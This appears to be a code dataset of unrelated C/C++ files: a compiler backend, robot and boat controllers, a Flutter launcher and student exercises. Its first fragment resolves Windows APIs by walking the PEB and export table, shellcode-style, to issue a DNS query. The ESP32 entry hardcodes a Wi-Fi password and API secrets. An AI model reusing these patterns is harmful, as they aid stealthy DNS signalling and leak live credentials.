kernelBaseAddr = 0x10;\n\n    auto mdllist = *(INT_PTR*)(peb + modList);\n    auto mlink = *(INT_PTR*)(mdllist + modListFlink);\n    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);\n    auto mdl = (LDR_MODULE*)mlink;\n    do {\n        mdl = (LDR_MODULE*)mdl->e[0].Flink;\n        if (mdl->base != nullptr) {\n            char name[64];\n            if (!cmpstr(\"kernel32.dll\", unicode_name_transform_to_char(mdl, name))) {\n                break;\n            }\n        }\n    } while (mlink != (INT_PTR)mdl);\n\n    kernel32 = (HMODULE)mdl->base;\n    return kernel32;\n}\n\nstatic LPVOID getAPIAddr_byStr(HMODULE module_address, char* name)\n{\n    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module_address;\n    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module_address + img_dos_header->e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY img_export_directory = (PIMAGE_EXPORT_DIRECTORY)(\n    (LPBYTE)module_address + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    PDWORD fAddr = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfFunctions);\n    PDWORD fNames = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfNames);\n    PWORD  fOrd = (PWORD)((LPBYTE)module_address + img_export_directory->AddressOfNameOrdinals);\n\n    for (DWORD i = 0; i < img_export_directory->AddressOfFunctions; i++) {\n        LPSTR pFuncName = (LPSTR)((LPBYTE)module_address + fNames[i]);\n\n        char tmpFuncName[MAX_PATH];\n        cpystr(tmpFuncName, pFuncName);\n        _CharLowerA(tmpFuncName);\n\n        if (!cmpstr(name, tmpFuncName))\n        {\n            return (LPVOID)((LPBYTE)module_address + fAddr[fOrd[i]]);\n        }\n\n    }\n    return nullptr;\n}\n\n#pragma comment(lib, \"dnsapi.lib\")\n\nint main(wchar_t *dns_str) {\n\n    HMODULE mod_kernel32 = getKernel32_by_str();\n    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr_byStr(mod_kernel32, \"getprocaddress\");\n\n    fnLoadLibraryA myLoadLibrary = (fnLoadLibraryA)myGetProcAddress(mod_kernel32, \"LoadLibraryA\");\n\n    HMODULE dnsLib = myLoadLibrary(\"DNSAPI.dll\");\n    fnDnsQuery_W myDnsQuery_W = (fnDnsQuery_W)myGetProcAddress(dnsLib, \"DnsQuery_W\");\n\n    PDNS_RECORD dnsRecord;\n\n    myDnsQuery_W(\n        dns_str,\n        DNS_TYPE_A,\n        DNS_QUERY_STANDARD,\n        NULL,\n        &dnsRecord,\n        NULL\n    );\n\n    return 0;\n}",
    "\r\n\r\n#include <WiFi.h>  // \u5305\u542bWiFi\u5e93\r\n#include <HTTPClient.h>  // \u5305\u542bHTTPClient\u5e93\r\n#include <ArduinoJson.h>  // \u5305\u542bArduinoJson\u5e93\r\n#include <SoftwareSerial.h>  // \u5305\u542bSoftwareSerial\u5e93\uff08\u7528\u4e8e\u4e32\u53e3\u901a\u8baf\uff09\r\n#include <driver/i2s.h> // \u7528\u4e8e\u914d\u7f6eI2S\u7684\u9a71\u52a8\r\n#include \"base64.h\"\r\n#include \"cJSON.h\"\r\n\r\n// \u5e38\u91cf\u548c\u5b8f\u5b9a\u4e49\r\n#define key 0\r\n#define ADC 2\r\n\r\n// \u5b9a\u4e49\u6a21\u62df\u4e32\u53e3\u7684\u53d1\u9001\u7aef\u53e3\r\n#define TX_PIN 17\r\n#define RX_PIN 18\r\n\r\n\r\nconst int DEV_PID = 1537;\r\nconst char* CUID = \"44950592\";\r\nconst char* CLIENT_ID = \"myQ10rFInKFzFtd6EjRLjMET\";\r\nconst char* CLIENT_SECRET = \"ObU2fYI7xzOCtJTyXKDpxVhV6mHRV4Xw\";\r\n\r\nconst char* ssid = \"HONOR\";  // WiFi\u7f51\u7edc\u540d\u79f0\r\nconst char* password = \"wrqcctv123\";  // WiFi\u5bc6\u7801\r\n\r\nconst char* TTS_URL = \"http://tsn.baidu.com/text2audio\";  // TTS\u670d\u52a1URL\r\nconst char* TOKEN_URL = \"http://openapi.baidu.com/oauth/2.0/token\";  // \u83b7\u53d6token\u7684URL\r\n\r\nconst String ChatMindAiUrl = \"https://api.chatanywhere.com.cn/v1/chat/completions\";  // ChatMindAi API\u5730\u5740\r\nconst String ChatMindAiApiKey = \"sk-tetT9sM4MSA8a3LGJcZGxfuyN4c0fAfrcVm9uwqAJA2Yt3bq\";  // \u66ff\u6362\u4e3a\u4f60\u7684ChatMindAi API\u5bc6\u94a5\r\n\r\nstatic const i2s_port_t i2s_num = I2S_NUM_1;  // i2s\u7aef\u53e3\u53f7\uff0c\u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u5185\u90e8DAC\uff0c\u5219\u5fc5\u987b\u4f7f\u7528I2S_NUM_0\r\n\r\nHTTPClient http_client;\r\nhw_timer_t* timer = NULL;\r\nconst int recordTimeSeconds = 5;\r\nconst int adc_data_len = 16000 * recordTimeSeconds;\r\nconst int data_json_len = adc_data_len * 2 * 1.4;\r\nuint16_t* adc_data;\r\nchar* data_json;\r\nuint8_t adc_start_flag = 0;\r\nuint8_t adc_complete_flag = 0;\r\nuint32_t num = 0;\r\nportMUX_TYPE timerMux = portMUX_INITIALIZER_UNLOCKED;\r\nuint32_t DataIdx = 0;\r\n\r\nWiFiClient client;  // \u521b\u5efaWiFi\u5ba2\u6237\u7aef\u5bf9\u8c61\r\n\r\nvoid IRAM_ATTR onTimer();\r\nString gainToken();\r\nvoid assembleJson(String token);\r\nvoid sendToSTT();\r\nString getGPTAnswer();\r\nvoid textToSpeech(const char* text);\r\n\r\nString uservoice;\r\nString cleanResult;\r\nString escapedResult;\r\nString prompter = \"\u4ecb\u7ecd\u4e00\u4e0b\u4f60\u81ea\u5df1\u3002\";\r\nuint32_t time1, time2;\r\n\r\n// I2S\u914d\u7f6e\u7ed3\u6784\u4f53\r\nstatic const i2s_config_t i2s_config = {\r\n    .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_TX),\r\n    .sample_rate = 16000,    // \u91c7\u6837\u738716000\r\n    .bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT,\r\n    .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\r\n    .communication_format = (i2s_comm_format_t)(I2S_COMM_FORMAT_I2S | I2S_COMM_FORMAT_I2S_MSB),\r\n    .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,       // \u9ad8\u4f18\u5148\u7ea7\u4e2d\u65ad\r\n    .dma_buf_count = 8,                             // 8\u4e2a\u7f13\u51b2\u533a\r\n    .dma_buf_len = 1024,                            // \u6bcf\u4e2a\u7f13\u51b2\u533a1K\u5b57\u8282\uff0c\u603b\u51718K\u5b57\u8282\u7684\u7f13\u51b2\u533a\u7a7a\u95f4\r\n    .use_apll = 0,\r\n    .tx_desc_auto_clear = true,\r\n    .fixed_mclk = -1\r\n};\r\n\r\nstatic const i2s_pin_config_t pin_config = {\r\n    .bck_io_num = 46,                     // \u65f6\u949f\u53e3\uff0c\u5bf9\u5e94\u4e8eMAX38357A\u7684BCLK\r\n    .ws_io_num = 15,                      // \u7528\u4e8e\u58f0\u9053\u9009\u62e9\uff0c\u5bf9\u5e94\u4e8eMAX38357A\u7684LRC\r\n    .data_out_num = 3,                   // ESP32\u7684\u97f3\u9891\u8f93\u51fa\u53e3, \u5bf9\u5e94\u4e8eMAX38357A\u7684DIN\r\n    //.data_in_num = I2S_PIN_NO_CHANGE      // ESP32\u7684\u97f3\u9891\u8f93\u5165\u63a5\u53e3\uff0c\u672c\u4f8b\u672a\u7528\u5230\r\n};\r\n\r\n\r\n// \u51fd\u6570\uff1a\u5c06\u5b57\u7b26\u4e32\u8fdb\u884cURL\u7f16\u7801\r\nString urlencode(const String& str) {\r\n    String encodedString = \"\";\r\n    char c;\r\n    char code0;\r\n    char code1;\r\n    for (unsigned int i = 0; i < str.length(); i++) {\r\n        c = str.charAt(i);\r\n        if (c == ' ') {\r\n            encodedString += '+';  // \u5c06\u7a7a\u683c\u66ff\u6362\u4e3a\u52a0\u53f7\r\n        }\r\n        else if (isalnum(c)) {\r\n            encodedString += c;  // \u5c06\u5b57\u6bcd\u548c\u6570\u5b57\u76f4\u63a5\u6dfb\u52a0\u5230\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\r\n        }\r\n        else {\r\n            code1 = (c & 0xf) + '0';\r\n            if ((c & 0xf) > 9) {\r\n                code1 = (c & 0xf) - 10 + 'A';  // \u83b7\u53d6\u5b57\u7b26\u7684\u4f4e4\u4f4d\uff0c\u5e76\u8f6c\u6362\u4e3a\u5bf9\u5e94\u768416\u8fdb\u5236\u5b57\u7b26\r\n            }\r\n            c = (c >> 4) & 0xf;\r\n            code0 = c + '0';\r\n            if (c > 9) {\r\n                code0 = c - 10 + 'A';  // \u83b7\u53d6\u5b57\u7b26\u7684\u9ad84\u4f4d\uff0c\u5e76\u8f6c\u6362\u4e3a\u5bf9\u5e94\u768416\u8fdb\u5236\u5b57\u7b26\r\n            }\r\n            encodedString += '%';  // \u6dfb\u52a0URL\u7f16\u7801\u7684\u524d\u7f00\r\n            encodedString += code0;  // \u6dfb\u52a0\u9ad84\u4f4d\u768416\u8fdb\u5236\u5b57\u7b26\r\n            encodedString += code1;  // \u6dfb\u52a0\u4f4e4\u4f4d\u768416\u8fdb\u5236\u5b57\u7b26\r\n        }\r\n        yield();  // \u653e\u5f03CPU\u63a7\u5236\u6743\uff0c\u4f7f\u5176\u4ed6\u4efb\u52a1\u6709\u673a\u4f1a\u6267\u884c\r\n    }\r\n    return encodedString;  // \u8fd4\u56de\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\r\n}\r\n\r\n\r\n\r\nvoid textToSpeech(const char* text) {\r\n    HTTPClient http;\r\n    String token = gainToken();  // \u83b7\u53d6\u8bbf\u95ee\u4ee4\u724c\r\n    Serial.println(\"Access Token: \" + token);  // \u6253\u5370\u8bbf\u95ee\u4ee4\u724c\r\n    String encoded_text = urlencode(text);  // \u5c06\u6587\u672c\u8fdb\u884cURL\u7f16\u7801\r\n    // \u6784\u5efaTTS\u8bf7\u6c42\u53c2\u6570\r\n    String tts_params = \"tok=\" + token + \"&tex=\" + encoded_text + \"&cuid=esp32&lan=zh&ctp=1&aue=4&spd=4&pit=5&vol=5&per=0\";\r\n\r\n    if (http.begin(client, TTS_URL)) {\r\n        http.addHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");  // \u6dfb\u52a0HTTP\u5934\u90e8\r\n        int httpCode = http.POST(tts_params);  // \u53d1\u9001POST\u8bf7\u6c42\r\n\r\n        if (httpCode > 0) {\r\n            if (httpCode == HTTP_CODE_OK) {\r\n                const size_t availableSize = 1 * 1024 * 1024;\r\n                size_t bytesRead = 0;\r\n                char* audioData = (char*)heap_caps_malloc(availableSize, MALLOC_CAP_SPIRAM);\r\n                if (audioData != nullptr) {\r\n                    WiFiClient* stream = http.getStreamPtr();  // \u83b7\u53d6HTTP\u54cd\u5e94\u6d41\r\n                    bytesRead = stream->readBytes(audioData, availableSize);  // \u8bfb\u53d6\u97f3\u9891\u6570\u636e\r\n                    // \u68c0\u67e5\u662f\u5426\u8bfb\u53d6\u5230\u4e86\u6570\u636e\r\n                    if (bytesRead > 0) {\r\n                        // \u8fd9\u91cc\u5047\u8bbeDataIdx\u662f\u5728\u51fd\u6570\u5916\u90e8\u5b9a\u4e49\u7684\r\n                        Da",
    "#include \"object.h\"\n#include \"../mips/utils.h\"\n\nnamespace memory {\nstd::vector<size_t> stk_size(1,128);\nstd::vector<int> global_tp_pos(1,0);\n\nint register_pos::RegNum = 0;\nregister_pos* register_pos::regs = new register_pos[32];\n\nstack_pos::stack_pos():sPos(-1), flag(-1){}\nstack_pos::stack_pos(size_t size) {  \n    if (global_tp_pos.back() + size > stk_size.back()) {\n        alloc_stack(stk_size.back());\n    }\n    sPos = global_tp_pos.back() + size;\n    global_tp_pos.back() += size;\n}\n\nnative::Str16 stack_pos::get_pos(size_t size) {\n    if (sPos == -1) {\n        debug(global_tp_pos, stk_size.back());\n        if (global_tp_pos.back() + size > stk_size.back()) {\n            alloc_stack(stk_size.back());\n        }\n        debug(\"alloc stackpos\");\n        sPos = global_tp_pos.back() + size;\n        global_tp_pos.back() += size;\n    }\n    debug(stk_size.back(), sPos);\n    return std::to_string(stk_size.back() - sPos) + \"($fp)\";\n}\n\nregister_pos::register_pos() {\n    rPos = RegNum ++;\n    this->nowUsing = nullptr;\n}\n\nnative::Str16 register_pos::get_pos() {\n    return \"$\" + std::to_string(rPos);\n}\n\nregister_pos* alloc_reg(obj::value_object* yue) {\n    for (int i = 8; i < 15; i ++) {\n        if (register_pos::regs[i].nowUsing == nullptr) {\n            register_pos::regs[i].nowUsing = yue;\n            return register_pos::regs + i;\n        }\n    }\n    return nullptr;\n}\n\nregister_pos* alloc_reg(obj::value_object* yue, int x) {\n    free_reg(register_pos::regs + x);\n    register_pos::regs[x].nowUsing = yue;\n    return register_pos::regs + x;\n}\n\nvoid free_reg(register_pos* reg) {\n    if (reg->nowUsing != nullptr) {\n        reg->nowUsing = nullptr;\n    }\n}\n\nvoid alloc_stack(size_t size, bool is_define) {\n    mips::binary_manage(\"addiu\", \"$sp\", -int(size), __PRETTY_FUNCTION__);\n    if (is_define) {\n        stk_size.push_back(size);\n        global_tp_pos.push_back(0);\n        save_fp();\n        move_fp();\n        return;\n    }\n    stk_size.back() += size;\n}\n\nvoid free_stack() {\n    load_fp();\n    mips::binary_manage(\"addiu\", \"$sp\", stk_size.back(), __PRETTY_FUNCTION__);\n    stk_size.pop_back();\n    global_tp_pos.pop_back();\n}\n\nvoid check_regs() {\n    std::cout << register_pos::RegNum << '\\n';\n    for (int i = 0; i < register_pos::RegNum; i ++) {\n        std::cout << ((register_pos::regs + i) -> nowUsing == nullptr) << ' ';\n    }\n    std::cout << std::endl;\n}\n\nvoid save_fp() {\n    int save_pos = stk_size.back() - 4;\n    global_tp_pos.back() += 4;\n    mips::binary_access(\"sw\", \"$fp\", std::to_string(save_pos) + \"($sp)\", __PRETTY_FUNCTION__);\n}\n\nvoid move_fp() {\n    mips::binary_access(\"move\", \"$fp\", \"$sp\", __PRETTY_FUNCTION__);\n}\n\nvoid load_fp() {\n    int save_pos = stk_size.back() - 4;\n    mips::binary_access(\"lw\", \"$fp\", std::to_string(save_pos) + \"($sp)\", __PRETTY_FUNCTION__);\n}\n\n} // namespace memory\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"coffeapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"main.h\"\n#include \"units/Angle.hpp\"\n#include \"units/Vector2D.hpp\"\n\n/**\n * A callback function for LLEMU's center button.\n *\n * When this callback is fired, it will toggle line 2 of the LCD text between\n * \"I was pressed!\" and nothing.\n */\nvoid on_center_button() {\n    static bool pressed = false;\n    pressed = !pressed;\n    if (pressed) {\n        pros::lcd::set_text(2, \"I was pressed!\");\n    } else {\n        pros::lcd::clear_line(2);\n    }\n}\n\n/**\n * Runs initialization code. This occurs as soon as the program is started.\n *\n * All other competition modes are blocked by initialize; it is recommended\n * to keep execution time for this mode under a few seconds.\n */\nvoid initialize() {\n    pros::lcd::initialize();\n    pros::lcd::set_text(1, \"Hello PROS User!\");\n    pros::lcd::register_btn1_cb(on_center_button);\n    units::Vector2D<AngularAcceleration> a(1_rpm2, 2_rpm2);\n    a.theta().convert(deg);\n    to_cDeg(a.theta());\n}\n\n/**\n * Runs while the robot is in the disabled state of Field Management System or\n * the VEX Competition Switch, following either autonomous or opcontrol. When\n * the robot is enabled, this task will exit.\n */\nvoid disabled() {}\n\n/**\n * Runs after initialize(), and before autonomous when connected to the Field\n * Management System or the VEX Competition Switch. This is intended for\n * competition-specific initialization routines, such as an autonomous selector\n * on the LCD.\n *\n * This task will exit when the robot is enabled and autonomous or opcontrol\n * starts.\n */\nvoid competition_initialize() {}\n\n/**\n * Runs the user autonomous code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the autonomous\n * mode. Alternatively, this function may be called in initialize or opcontrol\n * for non-competition testing purposes.\n *\n * If the robot is disabled or communications is lost, the autonomous task\n * will be stopped. Re-enabling the robot will restart the task, not re-start it\n * from where it left off.\n */\nvoid autonomous() {}\n\n/**\n * Runs the operator control code. This function will be started in its own task\n * with the default priority and stack size whenever the robot is enabled via\n * the Field Management System or the VEX Competition Switch in the operator\n * control mode.\n *\n * If no competition control is connected, this function will run immediately\n * following initialize().\n *\n * If the robot is disabled or communications is lost, the\n * operator control task will be stopped. Re-enabling the robot will restart the\n * task, not resume it from where it left off.\n */\nvoid opcontrol() {\n    pros::Controller master(pros::E_CONTROLLER_MASTER);\n    pros::MotorGroup left_mg({1, -2, 3}); // Creates a motor group with forwards ports 1 & 3 and reversed port 2\n    pros::MotorGroup right_mg({-4, 5, -6}); // Creates a motor group with forwards port 4 and reversed ports 4 & 6\n\n    while (true) {\n        pros::lcd::print(0, \"%d %d %d\", (pros::lcd::read_buttons() & LCD_BTN_LEFT) >> 2,\n                         (pros::lcd::read_buttons() & LCD_BTN_CENTER) >> 1,\n\n                         (pros::lcd::read_buttons() & LCD_BTN_RIGHT) >> 0); // Prints status of the emulated screen LCDs\n\n        // Arcade control scheme\n        int dir = master.get_analog(ANALOG_LEFT_Y); // Gets amount forward/backward from left joystick\n        int turn = master.get_analog(ANALOG_RIGHT_X); // Gets the turn left/right from right joystick\n        left_mg.move(dir - turn); // Sets left motor voltage\n        right_mg.move(dir + turn); // Sets right motor voltage\n        pros::delay(20); // Run for 20 ms then update\n    }\n}",
    "/*\nDevelopers: Jo\u00e3o Lehodey - joao.lehodey@tecnico.ulisboa.pt - DSOR/ISR team (Instituto Superior Tecnico) \n*/\n\n\n\n\n#include \"StateManager.h\"\n\n\n/**\n * @brief State Manager constructor\n*/\nStateManager::StateManager() : Node(\"glassy_state_manager\")\n{\n\n    // Initialize the parameters\n    this->declare_parameter(\"mission_type\", 2);\n    this->declare_parameter(\"rates/state_publishing\", 50);\n    this->declare_parameter(\"rates/actuator_publishing\", 40);\n    this->declare_parameter(\"rates/mission_info_publishing\", 2);\n    this->declare_parameter(\"timeouts/actuator_timeout\", 1500000000);\n    this->declare_parameter(\"timeouts/mission_timeout\", 20000000000);\n    this->declare_parameter(\"thrust_upper_limit\", 0.5);\n    this->declare_parameter(\"thrust_trim\", 0.0);\n    this->declare_parameter(\"rudder_trim\", 0.0);\n    this->declare_parameter(\"rudder_max_abs_input\", 1.0);\n    this->declare_parameter(\"gazebo_simulation\", true);\n\n\n\n    // get parameters\n    int state_publishing_rate = this->get_parameter(\"rates/state_publishing\").as_int();\n    int actuator_publishing_rate = this->get_parameter(\"rates/actuator_publishing\").as_int();\n    int mission_info_publishing_rate = this->get_parameter(\"rates/mission_info_publishing\").as_int();\n    int mission = this->get_parameter(\"mission_type\").as_int();\n    timeout_actuators_ = this->get_parameter(\"timeouts/actuator_timeout\").as_int();\n    mission_timeout_ = this->get_parameter(\"timeouts/mission_timeout\").as_int();\n    thrust_trim_ = this->get_parameter(\"thrust_trim\").as_double();\n    rudder_trim_ = this->get_parameter(\"rudder_trim\").as_double();\n    thrust_upper_limit_ = this->get_parameter(\"thrust_upper_limit\").as_double();\n    rudder_max_abs_input_ = this->get_parameter(\"rudder_max_abs_input\").as_double();\n    is_gazebo_simulator_ = this->get_parameter(\"gazebo_simulation\").as_bool();\n\n\n    // initialize parameter handlers\n    param_subscriber_ = std::make_shared<rclcpp::ParameterEventHandler>(this);\n\n    // define parameter callbacks\n    mission_type_callback_handler_ =param_subscriber_->add_parameter_callback(\"mission_type\", std::bind(&StateManager::mission_type_callback, this, std::placeholders::_1));\n    mission_timeout_callback_handler_= param_subscriber_->add_parameter_callback(\"timeouts/mission_timeout\", std::bind(&StateManager::mission_timeout_callback, this, std::placeholders::_1));\n    thrust_upper_limit_callback_handler_ = param_subscriber_->add_parameter_callback(\"thrust_upper_limit\", std::bind(&StateManager::thrust_upper_limit_callback, this, std::placeholders::_1));\n    rudder_max_abs_input_callback_handler_ = param_subscriber_->add_parameter_callback(\"rudder_max_abs_input\", std::bind(&StateManager::rudder_max_abs_input_callback, this, std::placeholders::_1));\n\n\n    // check that the mission type is valid\n\n    // Initialize the mission type based on the parameter\n    if(std::find(MissionTypes.begin(), MissionTypes.end(), mission) != MissionTypes.end()){\n        \n        mission_type_ = mission;\n    } else{\n        mission_type_ = MissionInfo::SUMMER_CHALLENGE;\n    }\n\n\n    // Initialize the variables\n    state_px4_msg_ = std::make_shared<glassy_msgs::msg::State>();\n    actuators_msg_ = std::make_shared<glassy_msgs::msg::Actuators>();\n    thrust_msg_ = std::make_shared<VehicleThrustSetpoint>();\n    torque_msg_ = std::make_shared<VehicleTorqueSetpoint>();\n    mission_info_msg_ = std::make_shared<glassy_msgs::msg::MissionInfo>();\n\n\n    // Initialize the mission status\n    mission_info_msg_->mission_mode = glassy_msgs::msg::MissionInfo::MISSION_OFF;\n\n    // Initialize publishers\n    state_px4_publisher_ = this->create_publisher<glassy_msgs::msg::State>(\"/glassy/state\", 1);\n    offboard_control_mode_publisher_ = this->create_publisher<OffboardControlMode>(\"/fmu/in/offboard_control_mode\", 10);\n    thrust_setpoint_publisher_ = this->create_publisher<VehicleThrustSetpoint>(\"/fmu/in/vehicle_thrust_setpoint\", 10);\n    torque_setpoint_publisher_ = this->create_publisher<VehicleTorqueSetpoint>(\"/fmu/in/vehicle_torque_setpoint\", 10);\n    vehicle_command_publisher_ = this->create_publisher<VehicleCommand>(\"/fmu/in/vehicle_command\", 10);\n    mission_info_publisher_ = this->create_publisher<glassy_msgs::msg::MissionInfo>(\"/glassy/mission_status\", 10);\n\n    //subriber profile\n    rmw_qos_profile_t qos_profile = rmw_qos_profile_sensor_data;\n    auto qos = rclcpp::QoS(rclcpp::QoSInitialization(qos_profile.history, 5), qos_profile);\n\n    //Initialize subscribers\n    vehicle_control_mode_ = this->create_subscription<VehicleControlMode>(\"fmu/out/vehicle_control_mode\", qos, std::bind(&StateManager::vehicle_control_mode_callback, this, std::placeholders::_1));\n\n    vehicle_odometry_ = this->create_subscription<VehicleOdometry>(\"fmu/out/vehicle_odometry\", qos, std::bind(&StateManager::vehicle_odometry_callback, this, std::placeholders::_1));\n\n    actuator_glassy_subscriber_ = this->create_subscription<glassy_msgs::msg::Actuators>(\"/glassy/actuators\",1,  std::bind(&StateManager::actuator_glassy_",
    "/* \n * cycle.cpp \n * University of Michigan, Ann Arbor\n * EECS 281 Lab 9 Written.\n * SUBMIT ONLY THIS FILE TO GRADESCOPE.\n */\n\n// Common #includes for convenience.\n// No need to use them. \n// Remove any of them if you want.\n#include <algorithm>\n#include <deque>\n#include <functional>\n#include <iostream>\n#include <iterator>\n#include <limits>\n#include <list>\n#include <map>\n#include <math.h>\n#include <numeric>\n#include <queue>\n#include <set>\n#include <sstream>\n#include <stack>\n#include <string>\n#include <unordered_map>\n#include <unordered_set>\n#include <utility>\n#include <vector>\n\n#include \"cycle.h\"\n\nusing namespace std;\n\nbool is_graph_cyclic(const vector<vector<int>> &adj_list) {\n    vector<int> parent(adj_list.size(), -1);\n    parent[0] = 0;\n    queue<int> search;\n    search.push(0);\n    int curr = 0;\n    while (!search.empty()) {\n        for (auto &t: adj_list[curr]) {\n            if (parent[t]!=-1) return false;\n            search.push(t);\n            parent[t] = curr;\n        }\n        curr = search.front();\n        search.pop();\n    }\n  return false;\n}\n",
    "#include \"users.h\"\r\n\r\nusing namespace std;\r\n\r\nstruct user {\r\n    char name[50];\r\n    char password[100];\r\n};\r\n\r\nvoid CommonUser();\r\nvoid delete_account(const string &loggedInUser);\r\n\r\n\r\n//\u666e\u901a\u7528\u6237\u9009\u62e9\u70b9\u83dc/\u6ce8\u9500\r\nvoid CommonUser() {\r\n    int number;\r\n    cout << \"==========================================\\n\";\r\n    cout << \"Choose the operation you want to perform: \\npress 1 to place an order\\npress 2 to delete your account\\npress 3 to back to login page\\n\";\r\n    cout << \"==========================================\\n>>\";\r\n    number = getch();\r\n    cout << char(number) << endl;\r\n    if (number == '1') {\r\n        dishbill();\r\n    } else if (number == '2') {\r\n        delete_account(name);\r\n    } else if (number == '3') {\r\n        main();\r\n    } else {\r\n        cout << \"bad input :(\\n\";\r\n        CommonUser();\r\n    }\r\n}\r\n\r\n\r\n//\u6ce8\u9500\u8d26\u6237\u51fd\u6570\r\nvoid delete_account(const string &loggedInUser) {\r\n    char confirm;\r\n    cout << \"Are you sure to delete your account?(Y/n)\\n>>\" << endl;\r\n    cin >> confirm;\r\n    if (confirm == 'Y') {\r\n        ifstream fin(\"user.txt\");\r\n        ofstream tempFile(\"temp.txt\", ios::out);\r\n\r\n        user c;\r\n        bool found = false;\r\n\r\n        while (fin >> c.name >> c.password) {\r\n            if (c.name == loggedInUser) {\r\n                found = true;\r\n            } else {\r\n                tempFile << c.name << \" \" << c.password << endl;\r\n            }\r\n        }\r\n\r\n        fin.close();\r\n        tempFile.close();\r\n\r\n        // Remove the original file and rename the temporary file\r\n        if (found) {\r\n            remove(\"user.txt\");\r\n            rename(\"temp.txt\", \"user.txt\");\r\n            cout << \"Account \" << loggedInUser << \" has been successfully logged out and deleted\" << endl;\r\n        } else {\r\n            cout << \"Account \" << loggedInUser << \" not found or unable to delete\" << endl;\r\n            remove(\"temp.txt\"); // Delete the temporary file if the account was not found\r\n        }\r\n    } else if (confirm == 'n') {\r\n        CommonUser();\r\n    } else {\r\n        cout << \"bad input :(\\n\";\r\n        CommonUser();\r\n    }\r\n}\r\n",
    "#include \"../include/cube.h\"\n\nCube::Cube(glm::vec3 cubeMin, glm::vec3 cubeMax) {\n\t// Model matrix - Maybe decouple from cube?\n\tmodel = glm::mat4(1.0f);\n\n\t// Color of the cube\n\tcolor = glm::vec3(1.0f, 0.95f, 0.1f);\n\n    // Specify vertex positions\n    positions = {\n        // Front\n        glm::vec3(cubeMin.x, cubeMin.y, cubeMax.z),\n        glm::vec3(cubeMax.x, cubeMin.y, cubeMax.z),\n        glm::vec3(cubeMax.x, cubeMax.y, cubeMax.z),\n        glm::vec3(cubeMin.x, cubeMax.y, cubeMax.z),\n\n        // Back\n        glm::vec3(cubeMax.x, cubeMin.y, cubeMin.z),\n        glm::vec3(cubeMin.x, cubeMin.y, cubeMin.z),\n        glm::vec3(cubeMin.x, cubeMax.y, cubeMin.z),\n        glm::vec3(cubeMax.x, cubeMax.y, cubeMin.z),\n\n        // Top\n        glm::vec3(cubeMin.x, cubeMax.y, cubeMax.z),\n        glm::vec3(cubeMax.x, cubeMax.y, cubeMax.z),\n        glm::vec3(cubeMax.x, cubeMax.y, cubeMin.z),\n        glm::vec3(cubeMin.x, cubeMax.y, cubeMin.z),\n\n        // Bottom\n        glm::vec3(cubeMin.x, cubeMin.y, cubeMin.z),\n        glm::vec3(cubeMax.x, cubeMin.y, cubeMin.z),\n        glm::vec3(cubeMax.x, cubeMin.y, cubeMax.z),\n        glm::vec3(cubeMin.x, cubeMin.y, cubeMax.z),\n\n        // Left\n        glm::vec3(cubeMin.x, cubeMin.y, cubeMin.z),\n        glm::vec3(cubeMin.x, cubeMin.y, cubeMax.z),\n        glm::vec3(cubeMin.x, cubeMax.y, cubeMax.z),\n        glm::vec3(cubeMin.x, cubeMax.y, cubeMin.z),\n\n        // Right\n        glm::vec3(cubeMax.x, cubeMin.y, cubeMax.z),\n        glm::vec3(cubeMax.x, cubeMin.y, cubeMin.z),\n        glm::vec3(cubeMax.x, cubeMax.y, cubeMin.z),\n        glm::vec3(cubeMax.x, cubeMax.y, cubeMax.z) };\n\n    // Specify normals\n    normals = {\n        // Front\n        glm::vec3(0, 0, 1),\n        glm::vec3(0, 0, 1),\n        glm::vec3(0, 0, 1),\n        glm::vec3(0, 0, 1),\n\n        // Back\n        glm::vec3(0, 0, -1),\n        glm::vec3(0, 0, -1),\n        glm::vec3(0, 0, -1),\n        glm::vec3(0, 0, -1),\n\n        // Top\n        glm::vec3(0, 1, 0),\n        glm::vec3(0, 1, 0),\n        glm::vec3(0, 1, 0),\n        glm::vec3(0, 1, 0),\n\n        // Bottom\n        glm::vec3(0, -1, 0),\n        glm::vec3(0, -1, 0),\n        glm::vec3(0, -1, 0),\n        glm::vec3(0, -1, 0),\n\n        // Left\n        glm::vec3(-1, 0, 0),\n        glm::vec3(-1, 0, 0),\n        glm::vec3(-1, 0, 